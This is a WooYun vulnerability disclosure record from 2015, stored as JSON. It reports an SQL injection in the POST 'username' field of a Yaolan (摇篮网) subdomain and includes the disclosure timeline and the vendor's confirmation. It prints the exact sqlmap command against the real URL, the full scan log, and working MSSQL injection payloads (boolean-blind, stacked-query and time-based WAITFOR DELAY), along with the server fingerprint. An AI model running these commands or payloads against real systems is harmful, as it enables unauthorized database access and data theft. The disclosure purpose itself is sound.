{"id": 70087, "wybug_id": "wooyun-2015-0136134", "wybug_title": "摇篮网某站SQL注入 泄露数据", "wybug_corp": "摇篮网", "wybug_author": "crown丶prince", "wybug_date": "2015-08-23 13:02", "wybug_open_date": "2015-10-10 09:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向公众公开  简要描述： 摇篮网某站SQL注入 泄露数据 详细说明：  POST注入：【sqlmap语句】：python sqlmap.py -u \"http://mensao.app.yaolan.com/Test\" --data \"username=88952634 \" --current-db【注入点】:mensao.app.yaolan.com【POST】:username=88952634 current database:    'mensao.app.yaolan.com'【sqlmap截图】 如下：   漏洞证明：  \n\n【sqlmap过程】：\n[18:59:13] [INFO] testing connection to the target URL[18:59:13] [INFO] testing if the target URL is stable. This can take a couple of seconds[18:59:14] [INFO] target URL is stable[18:59:14] [INFO] testing if POST parameter 'username' is dynamic[18:59:14] [INFO] confirming that POST parameter 'username' is dynamic[18:59:14] [WARNING] POST parameter 'username' does not appear dynamic[18:59:14] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable[18:59:15] [INFO] testing for SQL injection on POST parameter 'username'[18:59:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[18:59:15] [INFO] POST parameter 'username' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[18:59:17] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft SQL Server'do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n][19:00:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[19:00:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'[19:00:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause'[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'[19:00:13] [INFO] testing 'MySQL inline queries'[19:00:13] [INFO] testing 'PostgreSQL inline queries'[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[19:00:13] [INFO] testing 'Oracle inline queries'[19:00:13] [INFO] testing 'SQLite inline queries'[19:00:13] [INFO] testing 'MySQL > 5.0.11 stacked queries'[19:00:13] [WARNING] time-based comparison requires larger statistical model, please wait.[19:00:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[19:00:23] [INFO] POST parameter 'username' seems to be 'Microsoft SQL Server/Sybase stacked queries' injectable[19:00:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[19:00:33] [INFO] POST parameter 'username' seems to be 'Microsoft SQL Server/Sybase time-based blind' injectable[19:00:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[19:00:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[19:00:33] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[19:00:34] [INFO] target URL appears to have 5 columns in queryinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n][19:00:36] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')[19:00:36] [INFO] checking if the injection point on POST parameter 'username' is a false positivePOST parameter 'username' is vulnerable. Do you want to keep testing the others(if any)? [y/N]sqlmap identified the following injection points with a total of 62 HTTP(s) requests:---Parameter: username (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=88952634 ' AND 9903=9903 AND 'QHqk'='QHqk    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: username=88952634 '; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: username=88952634 ' WAITFOR DELAY '0:0:5'-----[19:00:37] [INFO] testing Microsoft SQL Server[19:00:37] [INFO] confirming Microsoft SQL Server[19:00:38] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2005\n   修复方案：     版权声明：转载请注明来源 crown丶prince@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-08-26 09:40 厂商回复： 漏洞正在修复，感谢白帽子的工作！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}